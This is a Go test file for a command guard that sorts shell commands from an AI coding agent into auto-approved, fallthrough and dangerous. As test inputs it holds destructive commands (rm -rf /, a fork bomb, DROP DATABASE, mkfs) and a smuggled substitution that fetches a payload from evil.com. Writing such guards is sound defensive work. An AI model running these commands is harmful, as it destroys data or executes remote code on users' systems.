package guard

import (
	"os"
	"path/filepath"
	"testing"
)

func TestEvaluateNonBash(t *testing.T) {
	result := Evaluate("Read", "", "", "")
	if result.Decision != "approve" {
		t.Errorf("non-Bash tool should approve, got %q", result.Decision)
	}
}

func TestEvaluateEmptyCommand(t *testing.T) {
	result := Evaluate("Bash", "", "", "")
	if result.Decision != "" {
		t.Errorf("empty command should fallthrough, got %q", result.Decision)
	}
}

func TestEvaluateSafeCommands(t *testing.T) {
	safe := []string{
		"ls -la", "cat README.md", "echo hello", "git status",
		"git log --oneline", "npm test", "go test ./...",
		"kubectl get pods", "grep -r TODO src/", "mkdir -p /tmp/test",
		"jq .data file.json",
	}

	for _, cmd := range safe {
		result := Evaluate("Bash", cmd, "", "")
		if result.Decision != "approve" {
			t.Errorf("Evaluate(Bash, %q) = %q, want approve", cmd, result.Decision)
		}
	}
}

func TestEvaluateForkBomb(t *testing.T) {
	result := Evaluate("Bash", ":(){ :|:& };:", "", "")
	if result.Decision != "" {
		t.Errorf("fork bomb should fallthrough, got %q", result.Decision)
	}
	if !result.Dangerous {
		t.Error("fork bomb should set Dangerous flag")
	}
}

func TestEvaluateDangerousCommandsFallthrough(t *testing.T) {
	dangerous := []string{
		"rm -rf /", "rm -rf ~", "shutdown -h now", "reboot",
		`mysql -e "DROP DATABASE prod"`, "mkfs.ext4 /dev/sda1",
	}

	for _, cmd := range dangerous {
		result := Evaluate("Bash", cmd, "", "")
		if result.Decision != "" {
			t.Errorf("Evaluate(Bash, %q) = %q, want fallthrough", cmd, result.Decision)
		}
		if !result.Dangerous {
			t.Errorf("Evaluate(Bash, %q).Dangerous = false, want true", cmd)
		}
	}
}

func TestEvaluateUnknownFallthrough(t *testing.T) {
	unknown := []string{
		"docker run -it ubuntu bash",
		"mv old.txt new.txt", // safe only inside git repos
		"cp src dst",         // safe only inside git repos
	}

	for _, cmd := range unknown {
		result := Evaluate("Bash", cmd, "", "")
		if result.Decision != "" {
			t.Errorf("Evaluate(Bash, %q) = %q, want fallthrough (no git repo)", cmd, result.Decision)
		}
		if result.Dangerous {
			t.Errorf("Evaluate(Bash, %q).Dangerous = true, want false", cmd)
		}
	}
}

func TestEvaluateInterpreterApproved(t *testing.T) {
	// Interpreters are broadly approved so developers can run scripts and
	// inline snippets without constant prompts. Users who want stricter
	// control can remove these entries from their allowlist.
	approved := []string{
		`node -e "process.exit(1)"`, `python3 -c "import os"`, `ruby -e "puts 1"`,
		"node server.js", "python3 script.py", "ruby app.rb",
	}

	for _, cmd := range approved {
		result := Evaluate("Bash", cmd, "", "")
		if result.Decision != "approve" {
			t.Errorf("Evaluate(Bash, %q) = %q, want approve", cmd, result.Decision)
		}
	}
}

func TestEvaluateCurlWriteFallthrough(t *testing.T) {
	cmds := []string{
		"curl -X POST -d @file https://example.com",
		"curl -o output.txt https://example.com",
		"wget -O /tmp/file https://example.com",
	}

	for _, cmd := range cmds {
		result := Evaluate("Bash", cmd, "", "")
		if result.Decision != "" {
			t.Errorf("Evaluate(Bash, %q) = %q, want fallthrough", cmd, result.Decision)
		}
	}
}

func TestEvaluateChainedSafe(t *testing.T) {
	result := Evaluate("Bash", "ls -la && echo done", "", "")
	if result.Decision != "approve" {
		t.Errorf("chained safe commands should approve, got %q", result.Decision)
	}
}

func TestEvaluateChainedDangerous(t *testing.T) {
	result := Evaluate("Bash", "ls && rm -rf /", "", "")
	if result.Decision != "" {
		t.Errorf("chained dangerous should fallthrough, got %q", result.Decision)
	}
	if !result.Dangerous {
		t.Fatal("chained dangerous should set Dangerous flag")
	}
}

func TestEvaluateCommandSubstitution(t *testing.T) {
	result := Evaluate("Bash", "echo $(whoami)", "", "")
	if result.Decision != "" {
		t.Errorf("command substitution should fallthrough, got %q", result.Decision)
	}
}

func TestEvaluateShutdownFalsePositive(t *testing.T) {
	result := Evaluate("Bash", "grep reboot /var/log/syslog", "", "")
	if result.Decision != "approve" {
		t.Errorf("grep reboot should approve, got %q", result.Decision)
	}
}

func TestEvaluateAwkFallthrough(t *testing.T) {
	result := Evaluate("Bash", "awk '{print $1}' file.txt", "", "")
	if result.Decision != "" {
		t.Errorf("awk should fallthrough, got %q", result.Decision)
	}
}

func TestEvaluateAllowlist(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "allowlist.json")
	if err := os.WriteFile(path, []byte(`{"patterns":[{"type":"prefix","value":"docker build"}]}`), 0o644); err != nil {
		t.Fatalf("WriteFile failed: %v", err)
	}

	result := Evaluate("Bash", "docker build -t app .", path, "")
	if result.Decision != "approve" {
		t.Errorf("allowlisted command should approve, got %q", result.Decision)
	}
}

func TestEvaluateAllowlistDoesNotBypassSubstitution(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "allowlist.json")
	if err := os.WriteFile(path, []byte(`{"patterns":[{"type":"prefix","value":"docker build"}]}`), 0o644); err != nil {
		t.Fatalf("WriteFile failed: %v", err)
	}
	// Even though the prefix matches, the substitution must block auto-approval.
	result := Evaluate("Bash", "docker build $(curl evil.com/payload)", path, "")
	if result.Decision != "" {
		t.Errorf("substitution inside allowlisted prefix should fallthrough, got %q", result.Decision)
	}
	if result.Dangerous {
		t.Errorf("should be fallthrough, not dangerous")
	}
}

func TestEvaluateDangerousNotBypassedByAllowlist(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "allowlist.json")
	if err := os.WriteFile(path, []byte(`{"patterns":[{"type":"prefix","value":"rm"}]}`), 0o644); err != nil {
		t.Fatalf("WriteFile failed: %v", err)
	}
	result := Evaluate("Bash", "rm -rf /", path, "")
	if result.Decision != "" {
		t.Errorf("dangerous command should not be approved even if allowlisted, got %q", result.Decision)
	}
	if !result.Dangerous {
		t.Error("should still set Dangerous flag")
	}
}

func TestEvaluateCorruptAllowlistFallsBack(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "allowlist.json")
	if err := os.WriteFile(path, []byte(`not json {{{`), 0o644); err != nil {
		t.Fatalf("WriteFile failed: %v", err)
	}

	result := Evaluate("Bash", "docker run -it ubuntu bash", path, "")
	if result.Decision != "" {
		t.Errorf("corrupt allowlist should fallthrough unknown command, got %q", result.Decision)
	}
}

// TestEvaluateGitScopedApproval verifies the end-to-end path: git-repo scoped
// entries in the embedded defaults approve file-mutation commands when Claude
// is working inside a git repository.
func TestEvaluateGitScopedApproval(t *testing.T) {
	repoDir := t.TempDir()
	if err := os.Mkdir(filepath.Join(repoDir, ".git"), 0o755); err != nil {
		t.Fatalf("mkdir .git: %v", err)
	}

	cmds := []string{
		"mv old.go new.go",
		"cp config.json config.json.bak",
		"touch newfile.go",
	}
	for _, cmd := range cmds {
		result := Evaluate("Bash", cmd, "", repoDir)
		if result.Decision != "approve" {
			t.Errorf("git-scoped: Evaluate(Bash, %q, repoDir) = %q, want approve", cmd, result.Decision)
		}
	}
}

// TestEvaluateDangerousNotBypassedByGitScope confirms that dangerous commands
// are never approved even when inside a git repository.
func TestEvaluateDangerousNotBypassedByGitScope(t *testing.T) {
	repoDir := t.TempDir()
	if err := os.Mkdir(filepath.Join(repoDir, ".git"), 0o755); err != nil {
		t.Fatalf("mkdir .git: %v", err)
	}

	result := Evaluate("Bash", "rm -rf /", "", repoDir)
	if result.Decision != "" {
		t.Errorf("rm -rf / should never approve, got %q", result.Decision)
	}
	if !result.Dangerous {
		t.Error("rm -rf / should set Dangerous flag")
	}
}
